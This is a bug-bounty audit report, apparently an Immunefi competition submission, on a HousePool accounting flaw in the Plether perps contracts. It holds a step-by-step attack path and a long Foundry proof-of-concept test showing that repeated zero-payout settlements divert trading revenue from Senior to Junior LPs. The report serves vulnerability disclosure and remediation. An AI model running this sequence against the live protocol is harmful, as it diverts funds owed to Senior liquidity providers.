# \#98081 [SC-High] # Repeated settlement of residual recapitalization erases Senior recovery priority and diverts trading revenue to Junior LPs

**Submitted on Nov 4th 2026 at 23:06:41 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98081
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

Brief/Intro

`HousePool` can settle the residual of an owner recapitalization against assets it has already attributed to Senior. A later permissionless LP settlement reduces the Senior recovery high-water mark without new value, so realized trading revenue that should restore Senior LPs is credited to Junior LPs and can be withdrawn by them.

## Vulnerability Details

### Root cause in the frozen source

The following Solidity fragments are copied from the in-scope perps source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. [`HousePool._settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834) caps pending claimant buckets by the *entire* terminal distributable balance:

```solidity
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

That balance includes assets already attributed to existing claimant principal. [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L72) reserves the selected bucket by subtracting it from the same balance before comparing equity with principal:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

If a residual recapitalization bucket is at least as large as the already-backed Senior amount, a reconciliation with no new cash treats that Senior principal as a loss. The pending preview then applies recapitalization to the emptied waterfall. In [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L130), the bootstrap branch re-credits Senior principal but replaces its high-water mark with the *current outstanding* recapitalization intent:

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

[`HousePool._applyPendingClaimantBucketsLive`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1792) then calls this decrement, even though the pass added no pool cash:

```solidity
function _decreasePendingClaimantBuckets(
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal {
    pendingRecapitalizationAssets -= claimantBuckets.recapitalizationAssets;
    pendingTradingRevenueAssets -= claimantBuckets.revenueAssets;
}
```

On a later revenue event, the reduced mark changes the actual allocation in [`HousePoolWaterfallAccountingLib.distributeRevenue`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L138-L160):

```solidity
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}

if (nextState.seniorPrincipal > nextState.seniorHighWaterMark) {
    nextState.seniorHighWaterMark = nextState.seniorPrincipal;
}

nextState.juniorPrincipal += remaining;
```

The first settlement records the full Senior recovery target. Later settlements consume the residual against already-credited backing, lower the target, and permit revenue to reach Junior before the original Senior recovery is met.

### Attack path

1. Senior and Junior LPs hold shares. Trader claims exceed pool assets, creating a terminal deficit. The engine owner performs the documented recovery actions: `CfdEngine.recapitalizePool` with funding above the deficit, followed by `clearDegradedMode`. An LP epoch settlement attributes the backed portion to Senior, records the full recovery high-water mark, and leaves the deficit-covered portion pending.
2. The Junior LP requests redemption after Junior principal has been wiped out. When the request matures, an unprivileged caller invokes `OrderRouter.settleLpEpoch` with a valid Pyth update. The zero-payout request advances the epoch, triggers `HousePool._reconcile`, and makes the Junior shares refundable.
3. The Junior LP claims the refund and repeats the request and settlement while the residual bucket remains. Each pass can consume already-attributed backing and reduce the Senior high-water mark without new pool cash or a Senior withdrawal.
4. A separate trader later closes a losing position. Collected LP-owned trading revenue reaches the waterfall. The lowered mark directs value to Junior principal before the original Senior recovery target has been restored.
5. The Junior LP redeems the funded portion of its shares for USDG. The same Senior LP receives less USDG on redemption than in the matched execution without the extra settlements. Junior withdrawal remains subject to the normal covenant.

The Junior LP needs no privileged role. The owner recovery actions and the terminal deficit are preconditions; the Junior LP does not control the owner or oracle.

### Incomplete public fix

SC Audit Studio's public SC-L1 finding concerned uncapped claimant-bucket credit. [PR #29](https://github.com/Plether-Fi/plether-core/pull/29) introduced the cap by distributable value and stated that residual intent remains pending until backed. At the frozen commit, that cap also counts value already attributed to Senior as backing on a later reconciliation. The reproduced no-inflow settlement consumes the residual and overwrites the Senior recovery mark, demonstrating the incomplete behavior of that public fix.

### Remediation

Settle residual claimant buckets only against backing that has become available since existing principal and unassigned value were attributed. Preserve the full Senior recovery target across residual settlement, and decrement pending amounts only when genuinely backed. Cover repeated no-inflow reconciliations, later trading revenue, simultaneous inflows and terminal losses, and LP preview/settlement parity in regression tests.

## Impact Details

Selected in-scope impact: **High — Theft of unclaimed yield**.

The affected security parameter is `seniorHighWaterMark`, the entitlement that gives impaired Senior LPs first claim on later LP revenue. Repeated settlement can erase recovery priority up to the value of the residual recapitalization bucket without changing pool cash. When trading revenue is then collected, its allocation goes to Junior shares before the affected Senior users are restored. A Junior holder can redeem part of that diverted revenue as USDG.

## Proof of Concept

## PoC Explanation

The single differential test starts from one snapshot after the first recapitalization settlement. It executes extra no-inflow LP settlements in the attack branch, records the resulting time, then reverts to the snapshot and advances the control branch to that same time. Both branches use the same Router trade, price updates, Junior exit request, and Senior exit request. The test asserts equality of collected trading revenue and checks actual USDG transfers on redemption.

The fixture uses the repository `MockPyth` and mock USDG token; prices, trader balances, LP deposits, and scenario timing are local test inputs. It applies the release risk settings from `DEPLOYMENT.md` and release HousePool limits through the real timelocked configuration path. An external Senior LP deposits 30,000 USDG and an external Junior LP deposits 10,000 USDG, in addition to the repository's 1,000 USDG seed in each tranche. Interleaved long and short Router orders create 28,423.062727 USDG of trader claims against 13,500.902105 USDG of pool assets; the owner then recapitalizes 22,383.240933 USDG and clears degraded mode. These fixture prices intentionally reach a terminal deficit; no oracle compromise is assumed for the later settlement bug.

After the first settlement, Senior principal is 7,461.080311 USDG, its high-water mark is 22,383.240933 USDG, and pending recapitalization is 14,922.160622 USDG. Additional Junior zero-payout redemption epochs in the attack branch return the shares but reduce the mark to 7,461.080311 USDG and consume the pending amount without moving pool assets. Each branch then collects the same 2,472.028000 USDG of realized trading revenue from a separate losing trader. In the control branch, Senior principal becomes 9,933.108311 USDG and the Senior user's share value and actual redemption are 9,612.475908 USDG; Junior's redemption receives zero. In the attack branch, Senior principal remains 7,461.080311 USDG, the Senior user's pre-exit share value is 7,220.242898 USDG and actual redemption is 7,220.308836 USDG, while the Junior user actually redeems 606.757922 USDG. The Senior user's cash redemption is 2,392.167072 USDG lower than the matched control. The remaining Junior allocation is subject to the withdrawal covenant.

The test reproduces the accounting and transfers locally through the project's own contracts and harness. Its controlled dependencies are `MockPyth`, mock USDG, and fixture market moves; it does not claim that the fixture's market sequence or token amounts occurred on Sepolia. The attached Solidity file also contains an opt-in negative-control assertion in `test_ResidualRecapitalizationSettlementBurnsSeniorTargetAndPaysJunior`: selecting that test with `POC_NEGATIVE_CONTROL=true` checks the false idempotence assumption and fails with a nonzero Forge exit code.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice After a recapitalization that only partly fits above a terminal deficit, every permissionless LP
///         settlement re-settles the residual recapitalization bucket against value that already backs Senior
///         principal. Each settlement lowers `seniorHighWaterMark` without any inflow, and later trading revenue
///         that the waterfall owes to the impaired Senior tranche is credited to Junior and redeemed by a Junior LP.
/// @dev Run with `POC_NEGATIVE_CONTROL=true` to assert that the recovery target survives a no-inflow settlement;
///      that run must fail.
contract ResidualRecapSubmissionPoC is HousePoolAsyncTestBase {

    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant JUNIOR_LP = address(0x1E1);
    address internal constant LONG_TRADER = address(0xA11CE);
    address internal constant SHORT_TRADER = address(0xB0B);
    address internal constant LOSING_TRADER = address(0x10CE);
    address internal constant KEEPER = address(0xCAFE);

    uint256 internal constant SENIOR_LP_DEPOSIT = 30_000e6;
    uint256 internal constant JUNIOR_LP_DEPOSIT = 10_000e6;
    uint256 internal constant LEG_SIZE = 15_000e18;
    uint256 internal constant SIZE_QUANTUM = 100e18;
    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant LOW_PRICE = 0.05e8;
    uint256 internal constant HIGH_PRICE = 1.95e8;

    uint256 internal clientSeed;

    struct Ledger {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 seniorHighWaterMark;
        uint256 unassigned;
        uint256 pendingRecapitalization;
        uint256 poolAssets;
        uint256 poolBalance;
        uint256 seniorLpShares;
        uint256 seniorLpValue;
    }

    /// @dev Only the 1,000 USDG protocol seeds exist before the two user LP deposits made in `setUp`.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();

        // Release HousePool limits from packages/perps/DEPLOYMENT.md (40M USDG Senior cap, 80% Senior share).
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        _lpDeposit(juniorVault, JUNIOR_LP, JUNIOR_LP_DEPOSIT);
        _lpDeposit(seniorVault, SENIOR_LP, SENIOR_LP_DEPOSIT);
    }

    function test_ResidualRecapitalizationSettlementBurnsSeniorTargetAndPaysJunior() public {
        // 1. Router trading leaves the pool with trader claims above its assets (terminal deficit).
        _openBook();
        _commit(LONG_TRADER, CfdTypes.Side.LONG, 2 * LEG_SIZE, 0, engine.CAP_PRICE(), true);
        _executeAll(LOW_PRICE);
        assertTrue(engine.degradedMode(), "winning long close latches degraded mode");
        _commit(SHORT_TRADER, CfdTypes.Side.SHORT, 2 * LEG_SIZE, 0, 1, true);
        _executeAll(HIGH_PRICE);
        _assertFlat(LONG_TRADER);
        _assertFlat(SHORT_TRADER);
        uint256 traderClaims = engine.totalTraderClaimBalanceAssets();
        uint256 poolAssetsAtDeficit = pool.totalAssets();
        assertGt(traderClaims, poolAssetsAtDeficit, "trader claims exceed pool assets");
        uint256 deficit = traderClaims - poolAssetsAtDeficit;
        emit log_named_uint("trader claims", traderClaims);
        emit log_named_uint("pool assets", poolAssetsAtDeficit);
        emit log_named_uint("terminal deficit", deficit);

        // 2. Documented owner recovery: recapitalize above the deficit, then clear degraded mode once solvent.
        uint256 recapitalization = deficit + deficit / 2;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        engine.clearDegradedMode();
        emit log_named_uint("owner recapitalization", recapitalization);

        // 3. Settlement 1: the backed part of the recapitalization restores Senior and the full amount becomes the
        //    Senior recovery target; the part consumed by the deficit stays as a pending residual.
        _requestSettleAndRefund(juniorVault, JUNIOR_LP);
        Ledger memory first = _ledger();
        _logLedger("after settlement 1", first);
        assertEq(first.seniorPrincipal, recapitalization - deficit, "Senior credited with the backed recapitalization");
        assertEq(first.seniorHighWaterMark, recapitalization, "Senior recovery target is the full recapitalization");
        assertEq(first.pendingRecapitalization, deficit, "residual equals the deficit absorbed by recapitalization");
        assertEq(first.juniorPrincipal, 0, "Junior has no principal");

        // 4. Settlement 2: another LP request is settled. No inflow, trade, deposit or Senior withdrawal occurs.
        _requestSettleAndRefund(juniorVault, JUNIOR_LP);
        Ledger memory second = _ledger();
        _logLedger("after settlement 2", second);

        if (vm.envOr("POC_NEGATIVE_CONTROL", false)) {
            assertEq(second.seniorHighWaterMark, first.seniorHighWaterMark, "negative control: target unchanged");
        }

        assertEq(second.poolBalance, first.poolBalance, "no USDG entered or left the pool");
        assertEq(second.poolAssets, first.poolAssets, "pool assets unchanged");
        assertEq(second.seniorLpShares, first.seniorLpShares, "Senior LP made no withdrawal");
        assertEq(second.seniorPrincipal, first.seniorPrincipal, "Senior principal unchanged");
        assertLt(second.seniorHighWaterMark, first.seniorHighWaterMark, "Senior recovery target reduced");
        assertLt(second.pendingRecapitalization, first.pendingRecapitalization, "residual consumed without inflow");

        // 5. Ordinary settlements continue until the residual is gone.
        for (uint256 i; i < 4 && pool.pendingRecapitalizationAssets() != 0; ++i) {
            _requestSettleAndRefund(juniorVault, JUNIOR_LP);
        }
        Ledger memory burned = _ledger();
        _logLedger("after residual consumed", burned);
        assertEq(burned.pendingRecapitalization, 0, "residual fully consumed");
        assertEq(burned.poolAssets, first.poolAssets, "still no inflow");
        assertEq(burned.seniorPrincipal, first.seniorPrincipal, "Senior principal unchanged");
        assertLt(burned.seniorHighWaterMark, recapitalization, "Senior target below the recapitalization");

        // 6. New trading revenue: a trader opens and closes at a loss; the collected pledge is LP revenue.
        uint256 assetsBeforeRevenue = pool.totalAssets();
        uint256 losingSize = (burned.seniorPrincipal * 35 / 100) * 1e12 / SIZE_QUANTUM * SIZE_QUANTUM;
        uint256 losingNotional = losingSize / 1e12;
        _fundTrader(LOSING_TRADER, 2 * losingNotional);
        _commit(LOSING_TRADER, CfdTypes.Side.LONG, losingSize, losingNotional, ENTRY_PRICE, false);
        _executeAll(ENTRY_PRICE);
        _commit(LOSING_TRADER, CfdTypes.Side.LONG, losingSize, 0, engine.CAP_PRICE(), true);
        _executeAll(HIGH_PRICE);
        _assertFlat(LOSING_TRADER);
        uint256 revenue = pool.totalAssets() - assetsBeforeRevenue;
        emit log_named_uint("trading revenue", revenue);
        assertGt(revenue, 0, "pool received trading revenue");
        assertLt(
            revenue, recapitalization - burned.seniorPrincipal, "revenue is below the Senior gap the recapitalization set"
        );

        // 7. Settlement with the Junior LP's exit request: the revenue is credited to Junior and paid out.
        uint256 juniorShares = juniorVault.balanceOf(JUNIOR_LP);
        uint256 requestId = _requestRedeem(juniorVault, JUNIOR_LP, juniorShares);
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(ENTRY_PRICE);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, JUNIOR_LP);
        assertGt(claimableShares, 0, "Junior redemption funded");
        uint256 balanceBefore = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 redeemed = juniorVault.claimRedeem(requestId, claimableShares, JUNIOR_LP, JUNIOR_LP);
        assertEq(settlementToken.balanceOf(JUNIOR_LP) - balanceBefore, redeemed, "USDG transferred to Junior LP");
        assertGt(redeemed, 0, "Junior LP redeems revenue owed to Senior");
        assertLt(pool.seniorPrincipal(), recapitalization, "Senior remains below the recapitalization target");
        assertEq(seniorVault.balanceOf(SENIOR_LP), first.seniorLpShares, "Senior LP took no action");

        emit log_named_uint("Senior recovery target lost", recapitalization - burned.seniorHighWaterMark);
        emit log_named_uint("Senior principal after revenue", pool.seniorPrincipal());
        emit log_named_uint("Junior LP redeemed USDG", redeemed);
    }

    function _openBook() internal {
        _fundTrader(LONG_TRADER, 3000e6);
        _fundTrader(SHORT_TRADER, 3000e6);
        bytes[] memory markUpdate = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        router.updateMarkPrice(markUpdate);
        // Interleaved so every fill stays inside the release 40% skew limit.
        _commit(LONG_TRADER, CfdTypes.Side.LONG, LEG_SIZE, 750e6, ENTRY_PRICE, false);
        _commit(SHORT_TRADER, CfdTypes.Side.SHORT, LEG_SIZE, 750e6, ENTRY_PRICE, false);
        _commit(LONG_TRADER, CfdTypes.Side.LONG, LEG_SIZE, 750e6, ENTRY_PRICE, false);
        _commit(SHORT_TRADER, CfdTypes.Side.SHORT, LEG_SIZE, 750e6, ENTRY_PRICE, false);
        _executeAll(ENTRY_PRICE);
        (uint256 longSize,,,,,,) = engine.positions(LONG_TRADER);
        (uint256 shortSize,,,,,,) = engine.positions(SHORT_TRADER);
        assertEq(longSize, 2 * LEG_SIZE, "long opened");
        assertEq(shortSize, 2 * LEG_SIZE, "short opened");
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal {
        OrderV3Types.ExecutionBounds memory bounds;
        bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        bounds.allowedExecutionModes = 7;
        bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        bounds.maxExecutionBountyAssets = type(uint256).max;
        bounds.maxExecutionNotionalAssets = type(uint256).max;
        bounds.maxGrossAccountDebitAssets = type(uint256).max;
        bounds.maxActionChargeAssets = type(uint256).max;
        bounds.maxExplicitFeesAssets = type(uint256).max;
        bounds.maxPostPositionSize = type(uint256).max;
        bounds.maxPostLeverageBps = type(uint32).max;
        vm.prank(account);
        router.commitOrder(
            OrderV3Types.OrderRequest({
                clientOrderId: bytes32(++clientSeed),
                side: side,
                sizeDelta: size,
                marginDelta: margin,
                targetPrice: targetPrice,
                isClose: isClose,
                bounds: bounds
            })
        );
    }

    function _executeAll(
        uint256 price
    ) internal {
        uint64 maxOrderId = router.nextCommitId() - 1;
        bytes[] memory updates = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrderBatch(maxOrderId, updates);
    }

    function _lpDeposit(
        TrancheVault vault,
        address owner,
        uint256 assets
    ) internal {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(ENTRY_PRICE);
        uint256 claimable = vault.claimableDepositRequest(requestId, owner);
        vm.prank(owner);
        vault.claimDeposit(requestId, claimable, owner, owner);
    }

    function _requestRedeem(
        TrancheVault vault,
        address owner,
        uint256 shares
    ) internal returns (uint256 requestId) {
        _finishAsyncCooldown(vault, owner);
        vm.prank(owner);
        requestId = vault.requestRedeem(shares, owner, owner);
    }

    /// @dev An exit request for a tranche with zero principal settles with zero payout and the shares are refunded.
    function _requestSettleAndRefund(
        TrancheVault vault,
        address owner
    ) internal {
        uint256 shares = vault.balanceOf(owner);
        uint256 requestId = _requestRedeem(vault, owner, shares);
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(ENTRY_PRICE);
        assertEq(vault.refundableRedeemRequest(requestId, owner), shares, "zero-principal request refunded");
        vm.prank(owner);
        vault.claimRedeemRefund(requestId, owner, owner);
    }

    /// @dev Canonical permissionless keeper path: `OrderRouter.settleLpEpoch` refreshes the mark and settles epochs.
    function _keeperSettle(
        uint256 price
    ) internal {
        bytes[] memory updates = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(updates);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (vm.getBlockTimestamp() < timestamp) {
            vm.warp(timestamp);
        }
    }

    function _assertFlat(
        address account
    ) internal view {
        (uint256 size,,,,,,) = engine.positions(account);
        assertEq(size, 0, "position closed");
    }

    function _ledger() internal view returns (Ledger memory ledger) {
        ledger.seniorPrincipal = pool.seniorPrincipal();
        ledger.juniorPrincipal = pool.juniorPrincipal();
        ledger.seniorHighWaterMark = pool.seniorHighWaterMark();
        ledger.unassigned = pool.unassignedAssets();
        ledger.pendingRecapitalization = pool.pendingRecapitalizationAssets();
        ledger.poolAssets = pool.totalAssets();
        ledger.poolBalance = settlementToken.balanceOf(address(pool));
        ledger.seniorLpShares = seniorVault.balanceOf(SENIOR_LP);
        ledger.seniorLpValue = seniorVault.convertToAssets(ledger.seniorLpShares);
    }

    function _logLedger(
        string memory tag,
        Ledger memory ledger
    ) internal {
        emit log_named_string("ledger", tag);
        emit log_named_uint("  seniorPrincipal", ledger.seniorPrincipal);
        emit log_named_uint("  juniorPrincipal", ledger.juniorPrincipal);
        emit log_named_uint("  seniorHighWaterMark", ledger.seniorHighWaterMark);
        emit log_named_uint("  unassignedAssets", ledger.unassigned);
        emit log_named_uint("  pendingRecapitalization", ledger.pendingRecapitalization);
        emit log_named_uint("  pool totalAssets", ledger.poolAssets);
        emit log_named_uint("  Senior LP value", ledger.seniorLpValue);
    }


    function test_EqualCollectedLossWithExtraSettlementsPaysJuniorInsteadOfSenior() public {
        _openBook();
        _commit(LONG_TRADER, CfdTypes.Side.LONG, 2 * LEG_SIZE, 0, engine.CAP_PRICE(), true);
        _executeAll(LOW_PRICE);
        assertTrue(engine.degradedMode(), "winning long close latches degraded mode");
        _commit(SHORT_TRADER, CfdTypes.Side.SHORT, 2 * LEG_SIZE, 0, 1, true);
        _executeAll(HIGH_PRICE);
        _assertFlat(LONG_TRADER);
        _assertFlat(SHORT_TRADER);
        uint256 deficit = engine.totalTraderClaimBalanceAssets() - pool.totalAssets();
        assertGt(deficit, 0, "real trader claims exceed pool assets");

        uint256 recapitalization = deficit + deficit / 2;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        engine.clearDegradedMode();
        _requestSettleAndRefund(juniorVault, JUNIOR_LP);
        Ledger memory first = _ledger();
        assertGt(first.pendingRecapitalization, 0, "first settlement leaves a residual");
        assertEq(first.juniorPrincipal, 0, "Junior has zero principal after incident");
        uint256 snapshot = vm.snapshotState();

        // Attack: an ordinary Junior LP repeats the zero-payout epoch settlement before the
        // identical trade. The same backed distributable is consumed again each time.
        for (uint256 i; i < 4 && pool.pendingRecapitalizationAssets() != 0; ++i) {
            _requestSettleAndRefund(juniorVault, JUNIOR_LP);
        }
        uint256 attackTradeTime = block.timestamp;
        Ledger memory burned = _ledger();
        assertEq(burned.pendingRecapitalization, 0, "extra epochs consume the residual");
        assertEq(burned.poolAssets, first.poolAssets, "epochs add no pool assets");
        assertEq(burned.poolBalance, first.poolBalance, "epochs add no pool cash");
        assertEq(burned.seniorPrincipal, first.seniorPrincipal, "no Senior LP withdrawal");
        assertLt(burned.seniorHighWaterMark, first.seniorHighWaterMark, "recovery target burns");

        uint256 attackRevenue = _collectLoss(first.seniorPrincipal);
        uint256 attackCash = _exitJunior();
        Ledger memory attack = _ledger();
        uint256 attackJuniorBalance = settlementToken.balanceOf(JUNIOR_LP);
        uint256 attackSeniorCash = _exitSenior();
        emit log_named_uint("attack revenue", attackRevenue);
        emit log_named_uint("attack senior principal", attack.seniorPrincipal);
        emit log_named_uint("attack junior principal", attack.juniorPrincipal);
        emit log_named_uint("attack Senior LP redeemable NAV", attack.seniorLpValue);
        emit log_named_uint("attack Junior LP cash", attackCash);
        emit log_named_uint("attack Senior LP cash", attackSeniorCash);

        // Control: advance to the same trade time, but collect the loss without the intervening
        // settlement calls. Equal wall-clock time removes a carry/coupon timing confound.
        vm.revertToState(snapshot);
        vm.warp(attackTradeTime);
        uint256 controlRevenue = _collectLoss(first.seniorPrincipal);
        uint256 controlCash = _exitJunior();
        Ledger memory control = _ledger();
        uint256 controlSeniorCash = _exitSenior();
        emit log_named_uint("control revenue", controlRevenue);
        emit log_named_uint("control senior principal", control.seniorPrincipal);
        emit log_named_uint("control junior principal", control.juniorPrincipal);
        emit log_named_uint("control Senior LP redeemable NAV", control.seniorLpValue);
        emit log_named_uint("control Junior LP cash", controlCash);
        emit log_named_uint("control Senior LP cash", controlSeniorCash);
        emit log_named_uint("Junior LP extra cash", attackCash - controlCash);

        assertEq(attackRevenue, controlRevenue, "branches collect identical trader loss");
        assertGt(control.seniorPrincipal, attack.seniorPrincipal, "Senior recovers less after extra epochs");
        assertGt(control.seniorLpValue, attack.seniorLpValue, "independent Senior LP redeemable NAV falls");
        assertGt(attack.juniorPrincipal, control.juniorPrincipal, "Junior gains the diverted revenue");
        assertGt(attackCash, controlCash, "Junior LP extracts more USDG");
        assertGt(controlSeniorCash, attackSeniorCash, "independent Senior LP receives less USDG");
        assertEq(attackJuniorBalance, attackCash, "Junior LP balance increase comes from actual redemption");
        assertEq(settlementToken.balanceOf(JUNIOR_LP), controlCash, "control LP cash reflects redemption");
    }

    function _collectLoss(uint256 seniorPrincipalBefore) internal returns (uint256 revenue) {
        uint256 losingSize = (seniorPrincipalBefore * 35 / 100) * 1e12 / SIZE_QUANTUM * SIZE_QUANTUM;
        uint256 losingNotional = losingSize / 1e12;
        _fundTrader(LOSING_TRADER, 2 * losingNotional);
        uint256 assetsBefore = pool.totalAssets();
        _commit(LOSING_TRADER, CfdTypes.Side.LONG, losingSize, losingNotional, ENTRY_PRICE, false);
        _executeAll(ENTRY_PRICE);
        _commit(LOSING_TRADER, CfdTypes.Side.LONG, losingSize, 0, engine.CAP_PRICE(), true);
        _executeAll(HIGH_PRICE);
        _assertFlat(LOSING_TRADER);
        revenue = pool.totalAssets() - assetsBefore;
        assertGt(revenue, 0, "losing close produces pool revenue");
    }

    function _exitJunior() internal returns (uint256 cash) {
        return _exitVault(juniorVault, JUNIOR_LP);
    }

    function _exitSenior() internal returns (uint256 cash) {
        return _exitVault(seniorVault, SENIOR_LP);
    }

    function _exitVault(TrancheVault vault, address lp) internal returns (uint256 cash) {
        uint256 shares = vault.balanceOf(lp);
        uint256 requestId = _requestRedeem(vault, lp, shares);
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(ENTRY_PRICE);
        uint256 claimable = vault.claimableRedeemRequest(requestId, lp);
        if (claimable != 0) {
            vm.prank(lp);
            cash = vault.claimRedeem(requestId, claimable, lp, lp);
        }
        uint256 refundable = vault.refundableRedeemRequest(requestId, lp);
        if (refundable != 0) {
            vm.prank(lp);
            vault.claimRedeemRefund(requestId, lp, lp);
        }
    }
}
```
